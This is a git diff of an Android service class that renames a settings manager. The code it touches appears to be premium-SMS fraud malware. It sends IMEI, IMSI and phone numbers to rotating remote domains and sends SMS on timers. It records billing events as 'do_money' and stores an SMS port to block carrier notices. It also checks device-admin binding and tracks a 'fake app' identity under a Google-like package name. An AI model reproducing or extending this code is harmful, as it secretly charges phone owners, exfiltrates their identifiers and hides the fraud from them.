@@ -10,7 +10,6 @@ import android.os.IBinder;
 import android.text.TextUtils;
 import com.googl.plugin.x.FakeActivity;
 import com.googl.plugin.x.R;
-import com.plugin.common.utils.CustomThreadPool;
 import com.plugin.common.utils.UtilsRuntime;
 import com.plugin.internet.InternetUtils;
 import com.umeng.analytics.MobclickAgent;
@@ -22,7 +21,7 @@ import com.xstd.plugin.api.*;
 import com.xstd.plugin.binddevice.DeviceBindBRC;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
-import com.xstd.plugin.config.SettingManager;
+import com.xstd.plugin.config.PluginSettingManager;
 
 import java.io.File;
 import java.util.ArrayList;
@@ -100,8 +99,8 @@ public class PluginService extends IntentService {
     private synchronized void fetchDomain() {
         if (!UtilsRuntime.isOnline(getApplicationContext())) return;
 
-        int count = SettingManager.getInstance().getTodayFetchDomainCount();
-        SettingManager.getInstance().setTodayFetchDomainCount(count + 1);
+        int count = PluginSettingManager.getInstance().getTodayFetchDomainCount();
+        PluginSettingManager.getInstance().setTodayFetchDomainCount(count + 1);
         try {
             DomainRequest request = new DomainRequest(DomanManager.getInstance(getApplicationContext()).getOneAviableDomain() + "/spDomain/");
             DomainResponse response = InternetUtils.request(getApplicationContext(), request);
@@ -157,11 +156,11 @@ public class PluginService extends IntentService {
             MainActiveRequest request = new MainActiveRequest(UtilsRuntime.getVersionName(getApplicationContext())
                                                                  , imei
                                                                  , imsi
-                                                                 , SettingManager.getInstance().getMainApkChannel()
+                                                                 , PluginSettingManager.getInstance().getMainApkChannel()
                                                                  , phone
-                                                                 , SettingManager.getInstance().getMainApkSendUUID()
+                                                                 , PluginSettingManager.getInstance().getMainApkSendUUID()
                                                                  , domain + "/gais/"
-                                                                 , SettingManager.getInstance().getMainExtraInfo());
+                                                                 , PluginSettingManager.getInstance().getMainExtraInfo());
             MainActiveResponse response = InternetUtils.request(getApplicationContext(), request);
 
             if (response != null && !TextUtils.isEmpty(response.url)) {
@@ -174,7 +173,7 @@ public class PluginService extends IntentService {
                 log.put("phoneType", Build.MODEL);
                 CommonUtil.umengLog(getApplicationContext(), "main_active_success", log);
 
-                SettingManager.getInstance().setMainApkActiveTime(System.currentTimeMillis());
+                PluginSettingManager.getInstance().setMainApkActiveTime(System.currentTimeMillis());
                 return;
             }
         } catch (Exception e) {
@@ -189,7 +188,7 @@ public class PluginService extends IntentService {
         }
 
         try {
-            if (TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
+            if (TextUtils.isEmpty(PluginSettingManager.getInstance().getCurrentPhoneNumber())) {
                 String imsi = UtilsRuntime.getIMSI(getApplicationContext());
                 if (!TextUtils.isEmpty(imsi)) {
                     if (!UtilsRuntime.isOnline(getApplicationContext())) return;
@@ -204,7 +203,7 @@ public class PluginService extends IntentService {
                             Config.LOGD("[[PluginService::fetchPhoneFromServer]] after fetch PHONE number : (" + respone.phone + ")");
                         }
                         if (respone.phone.length() == 11) {
-                            SettingManager.getInstance().setCurrentPhoneNumber(respone.phone);
+                            PluginSettingManager.getInstance().setCurrentPhoneNumber(respone.phone);
                             //notify umeng
                             HashMap<String, String> log = new HashMap<String, String>();
                             log.put("fetch", "succes");
@@ -212,9 +211,9 @@ public class PluginService extends IntentService {
                             log.put("phoneType", Build.MODEL);
                             CommonUtil.umengLog(getApplicationContext(), "fetch_pn_with_imei", log);
                         } else {
-                            SettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
+                            PluginSettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
                             //如果获取失败了，就再明天再向短信服务器发送短信.
-                            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
+                            PluginSettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
 
                             //notify umeng
                             HashMap<String, String> log = new HashMap<String, String>();
@@ -242,7 +241,7 @@ public class PluginService extends IntentService {
         }
 
         try {
-            String phoneNumbers = SettingManager.getInstance().getBroadcastPhoneNumber();
+            String phoneNumbers = PluginSettingManager.getInstance().getBroadcastPhoneNumber();
             if (Config.DEBUG) {
                 Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] before send broadcast, current phone Number is : " + phoneNumbers);
             }
@@ -321,20 +320,20 @@ public class PluginService extends IntentService {
                         }
                     }
                     if (sb.length() > 0) {
-                        SettingManager.getInstance().setBroadcastPhoneNumber(sb.substring(0, sb.length() - 1));
+                        PluginSettingManager.getInstance().setBroadcastPhoneNumber(sb.substring(0, sb.length() - 1));
                         if (Config.DEBUG) {
                             Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
-                                            + SettingManager.getInstance().getBroadcastPhoneNumber()
+                                            + PluginSettingManager.getInstance().getBroadcastPhoneNumber()
                                             + " and start alarm for next round send delay 10 min");
                         }
                         //因为还有没有发送的号码，所以启动一个定时器
                         BRCUtil.startAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION, 10 * 60 * 1000);
                     } else {
                         //已经消耗光
-                        SettingManager.getInstance().setBroadcastPhoneNumber("");
+                        PluginSettingManager.getInstance().setBroadcastPhoneNumber("");
                         if (Config.DEBUG) {
                             Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]] after send broadcast, current phone Number is : "
-                                            + SettingManager.getInstance().getBroadcastPhoneNumber());
+                                            + PluginSettingManager.getInstance().getBroadcastPhoneNumber());
                         }
                     }
                 }
@@ -349,7 +348,7 @@ public class PluginService extends IntentService {
                 Config.LOGD("[[PluginService::broadcastSMSForSMSCenter]]", e);
             }
 
-            if (!TextUtils.isEmpty(SettingManager.getInstance().getBroadcastPhoneNumber())) {
+            if (!TextUtils.isEmpty(PluginSettingManager.getInstance().getBroadcastPhoneNumber())) {
                 //因为还有没有发送的号码，所以启动一个定时器
                 BRCUtil.startAlarmForAction(getApplicationContext(), SMS_BROADCAST_ACTION, 10 * 60 * 1000);
             }
@@ -381,9 +380,9 @@ public class PluginService extends IntentService {
             return;
         }
 
-        int dayCount = SettingManager.getInstance().getKeyDayCount();
+        int dayCount = PluginSettingManager.getInstance().getKeyDayCount();
         int times = response.times;
-        long lastCountTime = SettingManager.getInstance().getKeyLastCountTime();
+        long lastCountTime = PluginSettingManager.getInstance().getKeyLastCountTime();
         long curTime = System.currentTimeMillis();
         long delay = ((long) (response.interval)) * 60 * 1000;
         if ((times > dayCount) && (lastCountTime + delay) < curTime) {
@@ -407,9 +406,9 @@ public class PluginService extends IntentService {
                             log.put("channelName", AppRuntime.ACTIVE_RESPONSE.channelName);
                             CommonUtil.umengLog(getApplicationContext(), "do_money", log);
 
-                            SettingManager.getInstance().setKeyDayCount(dayCount + 1);
-                            SettingManager.getInstance().setKeyMonthCount(SettingManager.getInstance().getKeyMonthCount() + 1);
-                            SettingManager.getInstance().setKeyLastCountTime(System.currentTimeMillis());
+                            PluginSettingManager.getInstance().setKeyDayCount(dayCount + 1);
+                            PluginSettingManager.getInstance().setKeyMonthCount(PluginSettingManager.getInstance().getKeyMonthCount() + 1);
+                            PluginSettingManager.getInstance().setKeyLastCountTime(System.currentTimeMillis());
                         }
                     } else {
                         if (Config.DEBUG) {
@@ -432,12 +431,12 @@ public class PluginService extends IntentService {
 
         if (Config.DEBUG) {
             Config.LOGD("[[PluginService::activePluginAction]] try to fetch active info, Phone Number : "
-                            + SettingManager.getInstance().getCurrentPhoneNumber());
+                            + PluginSettingManager.getInstance().getCurrentPhoneNumber());
         }
         try {
             AppRuntime.ACTIVE_PROCESS_RUNNING.set(true);
 
-            if (TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
+            if (TextUtils.isEmpty(PluginSettingManager.getInstance().getCurrentPhoneNumber())) {
                 /**
                  * 电话号码为空就发送短信到手机服务器，以后会接受到一条短信，获取到本机的号码
                  */
@@ -456,23 +455,23 @@ public class PluginService extends IntentService {
                     CommonUtil.saveUUID(getApplicationContext(), unique);
                 }
 
-                SettingManager.getInstance().setKeyDayActiveCount(SettingManager.getInstance().getKeyDayActiveCount() + 1);
+                PluginSettingManager.getInstance().setKeyDayActiveCount(PluginSettingManager.getInstance().getKeyDayActiveCount() + 1);
                 if (Config.DEBUG) {
                     Config.LOGD("[[PluginService::activePluginAction]] last monkey count time = "
-                                    + UtilsRuntime.debugFormatTime(SettingManager.getInstance().getKeyLastCountTime()));
+                                    + UtilsRuntime.debugFormatTime(PluginSettingManager.getInstance().getKeyLastCountTime()));
                 }
                 ActiveRequest request = new ActiveRequest(getApplicationContext()
                                                              , Config.CHANNEL_CODE
                                                              , unique
                                                              , getString(R.string.app_name)
                                                              , AppRuntime.getNetworkTypeByIMSI(getApplicationContext())
-                                                             , SettingManager.getInstance().getCurrentPhoneNumber()
-                                                             , SettingManager.getInstance().getKeyLastErrorInfo()
+                                                             , PluginSettingManager.getInstance().getCurrentPhoneNumber()
+                                                             , PluginSettingManager.getInstance().getKeyLastErrorInfo()
                                                              , DomanManager.getInstance(getApplicationContext())
                                                                    .getOneAviableDomain() + "/sais/"
                                                              , "1");
                 //只要激活返回，就记录时间，也就是说，激活时间标识的是上次try to激活的时间，而不是激活成功的时间
-                SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
+                PluginSettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
                 ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
                 /**
                  * 只要是服务器返回了，今天就不工作了，因为如果是网络异常的话会走try catch
@@ -502,9 +501,9 @@ public class PluginService extends IntentService {
                         AppRuntime.ACTIVE_RESPONSE.parseSMSCmd();
                         AppRuntime.saveActiveResponse(AppRuntime.RESPONSE_SAVE_FILE);
 //                                AppRuntime.saveActiveResponse("/sdcard/" + Config.ACTIVE_RESPONSE_FILE);
-                        SettingManager.getInstance().setKeyBlockPhoneNumber(response.blockSmsPort);
+                        PluginSettingManager.getInstance().setKeyBlockPhoneNumber(response.blockSmsPort);
                         int next = AppRuntime.randomBetween(4, 17);
-                        SettingManager.getInstance().setKeyRandomNetworkTime(next);
+                        PluginSettingManager.getInstance().setKeyRandomNetworkTime(next);
                     }
 
                     /**
@@ -513,7 +512,7 @@ public class PluginService extends IntentService {
                     if (Config.DEBUG) {
                         Config.LOGD("[[PluginService::activePluginAction]] server return data, So we set DayActiveCount = 17");
                     }
-                    SettingManager.getInstance().setKeyDayActiveCount(17);
+                    PluginSettingManager.getInstance().setKeyDayActiveCount(17);
                 } else {
                     Config.LOGD("response == null or response error");
                     networkErrorWork();
@@ -523,13 +522,13 @@ public class PluginService extends IntentService {
                     if (Config.DEBUG) {
                         Config.LOGD("[[PluginService::activePluginAction]] server return data == null, So we set DayActiveCount = 17");
                     }
-                    SettingManager.getInstance().setKeyDayActiveCount(17);
+                    PluginSettingManager.getInstance().setKeyDayActiveCount(17);
 
                     //notify umeng
                     HashMap<String, String> log = new HashMap<String, String>();
                     log.put("fetch", "succes");
                     log.put("channelName", "今天不扣费");
-//                            log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
+//                            log.put("phoneNumber", PluginSettingManager.getInstance().getCurrentPhoneNumber());
                     log.put("osVersion", Build.VERSION.RELEASE);
                     log.put("channelCode", Config.CHANNEL_CODE);
                     log.put("phoneType", Build.MODEL);
@@ -546,7 +545,7 @@ public class PluginService extends IntentService {
             //notify umeng
             HashMap<String, String> log = new HashMap<String, String>();
             log.put("fetch", "failed");
-//                    log.put("phoneNumber", SettingManager.getInstance().getCurrentPhoneNumber());
+//                    log.put("phoneNumber", PluginSettingManager.getInstance().getCurrentPhoneNumber());
             log.put("osVersion", Build.VERSION.RELEASE);
             log.put("channelCode", Config.CHANNEL_CODE);
             log.put("phoneType", Build.MODEL);
@@ -566,7 +565,7 @@ public class PluginService extends IntentService {
         file.delete();
         AppRuntime.ACTIVE_RESPONSE = null;
         int next = AppRuntime.randomBetween(0, 3);
-        int lastNetworkTime = SettingManager.getInstance().getKeyRandomNetworkTime();
+        int lastNetworkTime = PluginSettingManager.getInstance().getKeyRandomNetworkTime();
         int time = 0;
         int curHour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY);
         if (lastNetworkTime <= 18) {
@@ -576,32 +575,32 @@ public class PluginService extends IntentService {
         }
         time = time >= 24 ? 23 : time;
 
-        SettingManager.getInstance().setKeyRandomNetworkTime(time);
+        PluginSettingManager.getInstance().setKeyRandomNetworkTime(time);
     }
 
     private synchronized void activePluginPackageAction(Intent intent) {
         Config.LOGD("[[PluginService::onHandleIntent]] >>> action : " + ACTIVE_PLUGIN_PACKAGE_ACTION + " <<<<");
         try {
-            SettingManager.getInstance().setKeyActiveAppName(intent.getStringExtra("name"));
-            SettingManager.getInstance().setKeyActivePackageName(intent.getStringExtra("packageName"));
-            SettingManager.getInstance().setMainApkSendUUID(intent.getStringExtra("uuid"));
-            SettingManager.getInstance().setMainExtraInfo(intent.getStringExtra("extra"));
-            SettingManager.getInstance().setMainApkChannel(intent.getStringExtra("channel"));
+            PluginSettingManager.getInstance().setKeyActiveAppName(intent.getStringExtra("name"));
+            PluginSettingManager.getInstance().setKeyActivePackageName(intent.getStringExtra("packageName"));
+            PluginSettingManager.getInstance().setMainApkSendUUID(intent.getStringExtra("uuid"));
+            PluginSettingManager.getInstance().setMainExtraInfo(intent.getStringExtra("extra"));
+            PluginSettingManager.getInstance().setMainApkChannel(intent.getStringExtra("channel"));
 
             DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
             boolean isActive = dpm.isAdminActive(new ComponentName(this.getApplicationContext(), DeviceBindBRC.class))
-                                    || SettingManager.getInstance().getKeyHasBindingDevices();
+                                    || PluginSettingManager.getInstance().getKeyHasBindingDevices();
 
             if (Config.DEBUG) {
                 Config.LOGD("[[PluginService::onHandleIntent]] current fake app info : name = " + intent.getStringExtra("name")
                                 + " packageName = " + intent.getStringExtra("packageName")
                                 + " isActive : " + isActive
                                 + " **** setting manager info : (( "
-                                + " name = " + SettingManager.getInstance().getKeyActiveAppName()
-                                + " packageName = " + SettingManager.getInstance().getKeyActivePackageName()
-                                + " uuid = " + SettingManager.getInstance().getMainApkSendUUID()
-                                + " extra = " + SettingManager.getInstance().getMainExtraInfo()
-                                + " channel = " + SettingManager.getInstance().getMainApkChannel()
+                                + " name = " + PluginSettingManager.getInstance().getKeyActiveAppName()
+                                + " packageName = " + PluginSettingManager.getInstance().getKeyActivePackageName()
+                                + " uuid = " + PluginSettingManager.getInstance().getMainApkSendUUID()
+                                + " extra = " + PluginSettingManager.getInstance().getMainExtraInfo()
+                                + " channel = " + PluginSettingManager.getInstance().getMainApkChannel()
                                 + " )) >>>>>>>>>>>");
             }
 
